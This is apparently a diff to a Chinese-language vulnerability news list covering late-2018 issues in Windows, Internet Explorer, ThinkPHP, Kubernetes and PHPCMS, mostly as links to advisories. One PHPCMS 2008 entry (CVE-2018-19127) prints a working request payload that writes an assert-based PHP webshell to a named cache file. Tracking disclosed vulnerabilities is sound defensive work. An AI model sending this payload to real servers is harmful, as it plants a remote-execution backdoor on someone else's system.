@@ -9,6 +9,22 @@ share: true
 
 2018
 ---
+1. **【20181221】Windows越权任意文件读取0day**
+    - <https://thehackernews.com/2018/12/windows-zero-day-exploit.html>
+    - <https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html>
+
+1. **【20181220】微软发布补丁修复一个在野利用的IE漏洞 CVE-2018-8653**
+    - <https://www.cnbeta.com/articles/tech/800317.htm>
+    - <https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8653>
+
+1. **【20181210】ThinkPHP发布V5.1.31、V5.0.23安全更新，修复Getshell漏洞**
+    - <https://mp.weixin.qq.com/s?__biz=MjM5OTEzMzQwMA==&mid=2651667456&idx=1&sn=746ee2b9aa2b02f6ff60ff906ec2939a>
+    - 受影响版本包括：V5.0.*、V5.1.*
+    - 修复的版本：V5.1.31、V5.0.23
+
+1. **【20181205】Kubernetes API特权提升漏洞CVE-2018-1002105**
+    - <https://github.com/kubernetes/kubernetes/issues/71411>
+
 1. **【20181128】PHPCMS 2008 任意文件写入 RCE CVE-2018-19127**
     - 描述：发恶意包：`/type.php?template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss`Shell落在这个文件：`/cache_template/rss.tpl.php` 内容：`"@unlink(FILE);assert($_POST[1]);"`
     - <http://www.yncert.org.cn/article/show/8119.html>
